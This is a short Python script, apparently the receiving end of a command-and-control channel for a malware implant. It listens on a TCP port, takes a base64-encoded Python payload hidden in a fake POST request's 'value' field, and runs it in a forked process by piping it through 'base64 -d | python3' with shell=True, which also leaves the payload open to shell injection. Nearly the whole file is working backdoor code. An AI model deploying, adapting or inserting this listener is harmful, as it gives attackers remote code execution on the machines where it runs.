import os
import socket
import subprocess
import urllib.parse

HOST = ""
PORT = 8081


def accept_connection():
    """Accept a connection from the beachhead sender and return the data received"""

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((HOST, PORT))
    sock.listen(1)
    conn, addr = sock.accept()

    data = b""
    while True:
        data_in = conn.recv(1024)
        data += data_in
        if len(data_in) < 1024:
            break
    sock.close()

    return data


def parse_cnc(data):
    """Parse the data received from the beachhead sender and return the implant

    The implant is base64 encoded and embedded as an attribute in a fake POST request.  The function
    extracts the implant from the request and returns the base64 encoded python code for the implant.
    """

    data = data.decode("utf-8")

    # Upload is the first part of the data section of the post request
    data = data.split("Upload")

    # Split along each attribute in the request
    data = data[1].split("&")

    # Find the implant attribute and decode it
    for d in data:
        if "value" in d:  # The implant is in the 'value' attribute
            d = d.split("=", 1)  # Split the attribute name from the value
            return urllib.parse.unquote(
                d[1]
            )  # Remove the URL encoding and return the implant


def execute_cnc(implant):
    """Execute the implant on the server

    The implant is base64 encoded python code.  This function decodes the implant and executes it
    using python3.
    """

    command = "echo " + implant + " | base64 -d | python3"

    # Fork the process and execute the implant.  Allows the implant to run
    # without the reveiver also running.
    pid = os.fork()
    if pid == 0:
        subprocess.Popen(command, shell=True)


data = accept_connection()
implant = parse_cnc(data)
execute_cnc(implant)
